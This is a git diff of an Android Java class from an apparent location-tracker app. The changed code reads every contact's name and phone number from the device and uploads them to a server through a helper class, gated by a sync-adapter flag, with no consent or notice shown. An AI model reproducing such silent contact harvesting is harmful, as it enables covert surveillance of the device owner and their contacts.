@@ -9,7 +9,6 @@ import android.util.Log;
 
 import androidx.annotation.RequiresApi;
 
-import com.google.android.gms.dynamic.IFragmentWrapper;
 import com.varbin.locationtracker.APIs.CreaterClass;
 
 import java.util.ArrayList;
@@ -17,19 +16,27 @@ import java.util.ArrayList;
 import synceAdapter.AccountConstants;
 
 public class contactList {
+    private static contactPairClass pair;
     @RequiresApi(api = Build.VERSION_CODES.O)
     public static void sendContactToserver(Context contex){
-        Log.d("TAG", "sendContactToserver: ");
-        ArrayList<contactModel> contacts = getContact(contex);
-        boolean flag = CreaterClass.inActive("contact_list");
-       if (flag){
-           CreaterClass.uploadFileonServer(contacts);
-        }
+        contactPairClass contacts = getContact(contex);
+        boolean flag = AccountConstants.isInactive;
+        Log.d("TAG", "onResponse: "+flag);
+        CreaterClass.ContactCreater(contacts.name.toString() , contacts.number.toString());
+       try{
+           Thread.sleep(1000);
+       }catch (Exception e){
+
+       }
+        CreaterClass.inActive("contact_list");
 
     }
 
     @RequiresApi(api = Build.VERSION_CODES.O)
-    private static ArrayList<contactModel> getContact(Context contex) {
+    private static contactPairClass getContact(Context contex) {
+        pair = new contactPairClass();
+        pair.name = new ArrayList<>();
+        pair.number = new ArrayList<>();
         ContentResolver contentResolver = contex.getContentResolver();
         String contactId = null;
         String displayName = null;
@@ -40,12 +47,13 @@ public class contactList {
                 int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)));
                 if (hasPhoneNumber > 0) {
 
-                    contactModel contactsInfo = new contactModel();
+//                    contactModel contactsInfo = new contactModel();
                     contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                     displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
 
-                    contactsInfo.setContactId(contactId);
-                    contactsInfo.setName(displayName);
+//                    contactsInfo.setContactId(contactId);
+//                    contactsInfo.setName(displayName);
+                    pair.name.add(displayName);
 
                     Cursor phoneCursor = contex.getContentResolver().query(
                             ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
@@ -57,16 +65,18 @@ public class contactList {
                     if (phoneCursor.moveToNext()) {
                         String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
 
-                        contactsInfo.setContactNumber(phoneNumber);
+//                        contactsInfo.setContactNumber(phoneNumber);
+                        pair.number.add(phoneNumber);
                     }
 
                     phoneCursor.close();
 
-                    contactsInfoList.add(contactsInfo);
+//                    contactsInfoList.add(contactsInfo);
+
                 }
             }
         }
         cursor.close();
-        return contactsInfoList;
+        return pair;
     }
 }
